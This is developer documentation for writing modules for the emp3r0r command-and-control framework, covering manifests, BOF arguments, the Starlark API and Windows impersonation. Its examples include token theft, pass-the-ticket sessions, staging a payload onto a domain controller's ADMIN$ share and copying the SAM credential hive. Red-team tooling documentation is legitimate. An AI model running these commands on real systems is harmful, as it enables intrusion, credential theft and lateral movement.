# Writing emp3r0r Modules

Modules extend the emp3r0r C2 with new commands. A module is a directory
containing a `config.json` manifest plus its payload sources. The C2 reads
every manifest at startup, registers each entry as a console command, and the
agent runs the payload in memory.

There are two kinds of modules:

- **Agent modules** run on the target. Their payload is one of:
  - `coff` — a Windows COFF or Linux relocatable object (BOF),
  - `starlark` — a script run by the embedded Starlark engine,
  - `dll` — a Windows DLL called in memory, or
  - `bash`, `python`, `powershell` — scripts run through the agent's script
    runner. These cannot impersonate tokens; prefer `starlark` for that.
- **C2 modules** (`"is_local": true`) run on the operator machine. They extend
  the console itself — `loader_windows` builds a loader on the C2,
  `crystal_pack` turns a DLL into PIC shellcode, and so on.

---

## 1. Directory layout

Modules live under `core/modules/`. A module can be standalone:

```text
core/modules/hello_linux/
├── config.json
├── Makefile
└── hello_linux.c
```

or a suite of related modules sharing one manifest and source tree:

```text
core/modules/SA/
├── config.json
├── Makefile
├── whoami.star
├── uptime.star
└── ...
```

The shared headers and helpers used by many modules live in
`core/modules/bof_common/` (BOF headers) and `core/modules/common/`
(cross-platform C sources such as RC4 and the indirect-syscall stubs). The C2
copies both into the operator workspace so module build scripts can reference
them by relative path.

---

## 2. `config.json`

A manifest is either a single module object or an array of objects. All fields
except `name` may be omitted; sensible defaults are supplied.

```json
{
  "name": "hello_linux",
  "build": "make",
  "author": "jm33-ng",
  "date": "2026-01-26",
  "comment": "Linux BOF Hello World",
  "is_local": false,
  "platform": "Linux",
  "path": "",
  "fileless": true,
  "parameters": [
    {
      "name": "who",
      "description": "Who to greet",
      "default": "World",
      "type": "cstr",
      "required": false
    }
  ],
  "agent_config": {
    "exec": "",
    "files": ["hello_linux.o"],
    "in_memory": true,
    "type": "coff",
    "interactive": false
  },
  "invocation": {
    "coff_export": "go"
  }
}
```

### Top-level fields

| Field | Meaning |
| --- | --- |
| `name` | Command name registered in the console. Must be unique. |
| `comment` | One-line description shown in help and agent output. |
| `author`, `date` | Metadata only. |
| `is_local` | `true` runs the module on the C2 instead of the target. |
| `platform` | `Linux`, `Windows`, or empty for cross-platform. Used for help and dependency wiring. |
| `path` | Filled in by the C2 with the module's working copy. Leave empty. |
| `fileless` | Informational flag for in-memory execution. |
| `build` | Command the C2 runs before the module executes, with the current flags appended (`--flag value`). Used by buildable and local modules, e.g. `bash ./build.sh`. |
| `dependencies` | Module names that must be loadable before this one runs. Windows BOFs get `coffloader` added automatically. |
| `module_files_memfs` | Upload every file in `agent_config.files` to encrypted memfs before the module runs. |
| `parameters` | The command's options (see below). |
| `agent_config` | How the payload is executed. |
| `invocation` | How options are turned into argv/BOF arguments. |

### `agent_config`

| Field | Meaning |
| --- | --- |
| `type` | `coff`, `starlark`, `dll`, `bash`, `python`, or `powershell`. |
| `files` | Payload files, relative to the module directory. BOFs list both `.x64.o` and `.x86.o` and the agent picks by architecture. For Starlark, `files[0]` is the entry script and the rest are companion files. |
| `in_memory` | Run without writing to disk. Almost always `true`. |
| `exec` | Entry script for script modules (`run.star`); empty for BOFs. |
| `interactive` | The module starts an interactive session (echo handshake before SSH). |
| `work_dir` | Optional working directory on the target. |
| `needs_root` | The C2 refuses to run the module unless the agent is root/SYSTEM. |

### `parameters`

Each parameter becomes a `--flag` on the generated console command. Fields:

| Field | Meaning |
| --- | --- |
| `name` | Flag name, used as `--name value`. |
| `description` | Help text. Required for every parameter. |
| `default` | Value used when the operator omits the flag. |
| `type` | Value type; also selects the COFF wire format (see §3). |
| `required` | Reject the invocation when the value is empty. |
| `choices` | Restrict the value to one of a fixed list. |
| `pattern` | Regex the value must match. |
| `min`, `max` | Numeric bounds for `int`/`short` types. |
| `secret` | Hide the value in help output. |
| `encoding` | Optional transport encoding for the value. |
| `argv_flag` | Prefix inserted before the value when building argv, e.g. `--user`. |

Avoid `force` and `help` as parameter names: they collide with the built-in
console flags.

### `invocation`

| Field | Meaning |
| --- | --- |
| `argv` | Literal tokens prepended to the argument list, e.g. `[{"literal": "download"}]` for a script that dispatches on its first argument. Parameters are appended after these in declaration order. |
| `coff_export` | BOF entry point. Use `go` for Beacon-compatible BOFs. |
| `stdin_param` | Parameter whose value is piped to the child process's stdin. |
| `timeout_seconds` | Kill the module after this many seconds. |
| `dll_export`, `dll_entry`, `dll_file_param` | DLL-only fields. Defaults match the standard in-memory DLL loader (`LoadAndRun`, `go`, `file`). |

---

## 3. Parameter types and BOF wire format

The `type` field is the single source of truth for both validation on the C2
and argument packing on the agent. BOF parameters are packed in declaration
order using the COFFLoader convention.

| Type value | Wire format | Packed as |
| --- | --- | --- |
| `int`, `uint32`, `int32`, `uint`, `dword`, `port`, `bool` | `i` | 32-bit integer |
| `short`, `int16`, `word` | `s` | 16-bit integer |
| `cstr`, `string`, `str`, `lpstr` | `z` | UTF-8 C string |
| `wstr`, `wstring`, `lpwstr`, `w` | `Z` | UTF-16LE wide string |
| `binary`, `base64` | `b` | Length-prefixed binary blob |

The single-character tokens `z`, `Z`, `i`, `s`, `b` are also accepted directly.
Any other value is not recognized and the BOF argument packer will fail when
the module runs, so stick to the table above.

Notes:

- Every declared BOF argument is packed even when the operator leaves it
  empty, so the BOF always receives a well-formed argument list. Empty
  numeric values are packed as zero.
- `argv_flag` only affects script modules and non-BOF invocation. For BOFs the
  value is packed directly.
- Starlark receives every parameter as a positional string, in order. It does
  its own `int()`/`bool()` conversion.

---

## 4. Building modules

The main build script (`core/build.py`) scans `core/modules/*/make_all.sh` and
runs each one automatically. You do not need to edit `build.py` to add a
module. A minimal build script:

`core/modules/MySuite/make_all.sh`:

```bash
#!/bin/bash
set -e
make -C src/MyBof -j"$(nproc)"
```

Keep compiled artifacts in the source tree and reference them by relative path
in `agent_config.files`. Do not copy them elsewhere.

`make_all.sh` is only for suites that need compiling ahead of time. A
single-file Starlark module needs no build step at all.

The `build` field is separate: it is a command
the C2 runs immediately before each execution, with the current flags
appended. `loader_windows` uses `"build": "bash ./build.sh"` for this.

Toolchain requirements for the C modules are documented in each module's
README. The Windows loader, for example, needs zig (installed by `build.py`),
`nasm`, and a native C compiler.

---

## 5. How modules become commands

At startup the C2 scans the module directories (the install prefix first, then
the operator workspace, with later directories overriding earlier ones). For
every valid manifest it:

1. builds a local module if it declares `build`, and copies buildable sources
   into the operator workspace;
2. creates a top-level console command named after the module, with one flag
   per parameter;
3. stores the module for later lookup. Invalid manifests are reported and
   skipped rather than half-registered.

There is no `use` / `set` / `run` module console. Invoke a module directly:

```text
sa_whoami --pid 1234
cifs_download --src '\\DC01\C$\Windows\system32\config\SAM' \
  --dest memfs:///SAM --token <SID>
```

---

## 6. Writing Starlark modules

Starlark is a small, deterministic Python dialect. The agent embeds the
engine, so scripts run with no interpreter on the target.

### Rules of the language

- **It is not Python.** There is no standard library: `import sys`, `re`,
  `os`, and friends do not exist.
- Integer formatting helpers such as `hex()` and the full `%` formatting
  specifier set are provided as built-ins, not language features.
- Use the built-ins below for memory access and string work; they are faster
  and safer than doing it by hand.

### Built-in API

#### Strings

| Function | Description |
| --- | --- |
| `sprintf(format, *args)` | `fmt.Sprintf` formatting (`%016x`, `%-30s`, ...). |
| `hex(value)` | Integer to a `0x...` string. |
| `str_split(s, sep)` / `str_join(list, sep)` | Split and join. |
| `str_replace(s, old, new, n=-1)` | Replace occurrences. |
| `str_contains(s, needle)` | Substring test. |
| `str_trim(s, cutset="")` | Trim whitespace or a character set. |
| `str_lower(s)` / `str_upper(s)` | Case conversion. |
| `str_startswith(s, prefix)` / `str_endswith(s, suffix)` | Prefix/suffix test. |
| `str_pad(text, width)` / `pad(text, width)` | Pad to a column width; right for positive, left for negative. |
| `str_index(s, needle)` | Index of a substring, or `-1`. |

#### Files, network, and processes

| Function | Description |
| --- | --- |
| `read_file(path)` / `write_file(path, content)` | Text file I/O. `memfs:///` paths go to the agent's encrypted memory filesystem. |
| `list_dir(path)` / `exists(path)` / `mkdir(path)` / `remove(path)` | Filesystem helpers. |
| `http_get(url)` / `http_post(url, content_type, body)` | HTTP requests returning the response body. |
| `exec_cmd(cmd, args=[])` | Run a command and return its combined output. |
| `crypto_hash(algo, data)` | Hash `data` with `md5`, `sha1`, or `sha256`. |
| `bytes_to_b64(data)` / `b64_to_bytes(b64)` | Binary-safe base64 round trip. |
| `write_bytes(path, data)` | Write binary data to a local or `memfs:///` path. |

#### Memory reads

All memory helpers take `(addr, offset=0)` and read little-endian.

`read_u8`/`read_uint8`, `read_u16`/`read_uint16`, `read_u32`/`read_uint32`,
`read_u64`/`read_uint64`/`read_ptr`, `read_i32`/`read_int32`, plus the
null-terminated string readers `read_wstring(ptr, max_len=256)` (UTF-16) and
`read_cstring(ptr, max_len=256)` / `read_ansi_string` (C/ANSI).

#### Memory writes and allocators

`write_byte`/`write_u8`/`write_uint8`, `write_u16`/`write_uint16`,
`write_u32`/`write_uint32`, `write_u64`/`write_uint64`/`write_ptr` all take
`(addr, val)` or `(addr, offset, val)`. `utf16_ptr(s)` and
`cstring_ptr(s)`/`ansi_ptr(s)` allocate unmanaged memory holding an encoded,
null-terminated copy of `s` and return its address.

#### Windows interop

| Function | Description |
| --- | --- |
| `win_call(dll, function, *args)` | Call an exported DLL function. Returns a dict with `r1`, `r2`, `err_code`, and `error`. |
| `win_alloc(size)` / `win_free(addr)` | `VirtualAlloc`/`VirtualFree`. `win_free(0)` is a no-op. |
| `win_read_mem(addr, size)` | Read raw bytes with `ReadProcessMemory`. |
| `current_token()` | Handle to the current effective token (thread token first, then process token). `0` on failure. Close it with `win_call("kernel32.dll", "CloseHandle", h)`. |

#### Linux syscalls

`sys_call(syscall_num, *args)`, `sys_alloc(size)`, `sys_free(addr)`,
`sys_read_mem(addr, size)` and their `lin_*` and `linux_*` aliases.

#### In-memory DLLs (Windows)

| Function | Description |
| --- | --- |
| `mem_load_library(data)` / `mem_load(data)` | Map a DLL image into memory; returns its base address as a handle. |
| `mem_proc_address(module, name)` | Address of a named export. |
| `mem_proc_ordinal(module, ordinal)` | Address of an export by ordinal. |
| `mem_base_addr(module)` | Base address of a loaded module. |
| `mem_free(module)` | Unload a module and drop its handle. |

#### Signed kernel drivers (Windows)

| Function | Description |
| --- | --- |
| `driver_load(path, name)` | Install and start a signed `.sys` from an absolute path. |
| `driver_load_bytes(data, name)` | Drop the image to `System32\drivers`, load it, then delete the file. |
| `driver_unload(name)` | Stop the driver and remove its service key. |
| `driver_is_loaded(name)` | Whether the service key exists. |
| `driver_is_signed(path)` | Offline Authenticode check with `WinVerifyTrust`. |

Only signed drivers are supported; no DSE bypass is attempted.

### The `agent` module

Every function is available both as `agent.foo()` and as a flat `agent_foo()`
alias:

| Function | Description |
| --- | --- |
| `sys_info()` | Dictionary of agent details (`tag`, `uuid`, `os`, `user`, `has_root`, `process`, `cwd`, ...). |
| `uptime()`, `user()`, `container()`, `has_root()` | Target environment queries. |
| `exec_shell(script, args=[], env=[])`, `exec_python(...)`, `exec_powershell(...)`, `exec_batch(...)` | Run a script in memory. |
| `sign(data)` | Sign with the agent's ephemeral key. |
| `tag()`, `uuid()` | Agent identifiers. |
| `touch_file(path)`, `fetch_file(file, peer="", path="", checksum="")` | Timestamp sync and file retrieval via the memfs/P2P/C2 pipeline. |

### Globals

- `argv` — the positional arguments passed to the script.
- `module_files` — memfs paths of companion files for multi-file modules.
- `current_token()` — see the Windows interop table above.

### Minimal script

```python
def main(*args):
    who = args[0] if args else "World"
    print("Hello %s!" % who)
    return "OK"
```

The script may return a string; the agent prints it to the operator.

---

## 7. Windows identity: tokens, sessions, and tickets

emp3r0r can run modules under another Windows identity. Three universal
options are injected into every token-aware module (`starlark`, `coff`, and
`dll`):

| Option | Meaning |
| --- | --- |
| `--token <SID\|session>` | Use a stolen token (`list_tokens`) or a netlogon session (`list_sessions`). |
| `--user <DOMAIN/user>` | Create or reuse a netonly netlogon session and run under it. Ignored when `--token` is set. |
| `--ticket <base64 KRB-CRED>` | Import a `.kirbi` ticket into the module's session before running. |

The supporting commands are:

| Command | Description |
| --- | --- |
| `steal_token --pid <PID>` | Steal and cache a process token; enables `SeDebugPrivilege` and `SeImpersonatePrivilege`. |
| `list_tokens` | List cached tokens and netlogon sessions. |
| `list_sessions` | List netlogon sessions created via `--user`. |

There is no separate `make_token` or `import_ticket` command: the session is
created and the ticket imported as part of the module invocation. If a module
declares its own `user` or `ticket` parameter, that declaration wins and the
universal option is disabled for it.

### How impersonation works

- **Starlark** wraps every I/O built-in (`read_file`, `win_call`, `exec_cmd`,
  ...) in `runWithToken`, which locks the OS thread, sets the thread token with
  an indirect `NtSetInformationThread`, performs the operation, and reverts.
  No code changes are needed in the script.
- **BOF/DLL** modules run on a dedicated goroutine. A pre-exec hook sets the
  thread token and a post-exec hook clears it, so any Win32 call the BOF makes
  sees the impersonated identity.
- **bash/python/powershell** cannot use thread tokens. Assigning one logs a
  warning; use a Starlark module instead.

### Netlogon sessions and pass-the-ticket

Kerberos APIs (`ptt`, `asktgt`, `klist`) are bound to a logon session in
LSASS, not to a token. `--user` creates a *netonly* (new-credentials) logon
session, the same primitive as Cobalt Strike's `make_token` or
`runas /netonly`. The password is never validated — the agent uses a dummy
value — and the session's token keeps the caller's local identity while
lending the supplied credentials to outbound network connections.

Typical pass-the-ticket flow:

```text
kerbeus_klist --user CORP.LOCAL/jdoe --ticket <base64 TGT>
kerbeus_asktgt --params '/user:jdoe ... /ptt' --token CORP.LOCAL/jdoe
```

The first line creates the session and imports the ticket; later modules reuse
the session by name. Without an imported ticket, network access falls back to
the netonly credentials and fails with `ERROR_LOGON_FAILURE` against remote
resources, exactly as with `make_token`.

### SMB/CIFS to agent-less hosts

The `cifs` suite uses this model to move files straight onto machines that run
no agent, over their `ADMIN$`/`C$` shares:

```text
cifs_upload --src memfs:///stage.exe --dest '\\DC01\ADMIN$\Temp\stage.exe' \
  --token <DA token>
cifs_download --src '\\DC01\C$\Windows\system32\config\SAM' \
  --dest memfs:///SAM --user CORP.LOCAL/da --ticket <base64 kirbi>
cifs_rm --dest '\\DC01\ADMIN$\Temp\stage.exe'
```

Every `CreateFileW`/`WriteFile` call impersonates the assigned token, so the
SMB redirector authenticates with the stolen identity or the imported ticket.
Pair with `scshell` to execute an uploaded file on the target.

---

## 8. Examples to copy from

| Module | Demonstrates |
| --- | --- |
| `hello_linux` | Minimal Linux BOF and `config.json`. |
| `procinfo` | Minimal Starlark module that reads `/proc`. |
| `SA/` | A suite of Windows Starlark modules, including token inspection in `whoami.star`. |
| `cifs/` | Token/ticket-aware SMB I/O. |
| `kkyum/` | Multi-file Starlark module loading a kernel driver from a companion `.sys` cached in memfs. |
| `injection/` | Remote thread injection under an operator-selected token. |
| `loader_windows/` | A local C2 module that builds a self-unpacking loader. |
| `CS-Situational-Awareness-BOF/` | A large third-party BOF suite imported as-is; every command is a top-level console command with one flag per BOF argument. |
| `C2-Tool-Collection/` | Outflank BOF suite with `choices`/`required` flags and a `make_all.sh` that builds a nested `BOF/` tree. |
| `SQL-BOF/` | SQL Server BOF suite; demonstrates fixed-value wrapper commands over a shared `togglemodule` BOF and a `binary` (base64) parameter. |
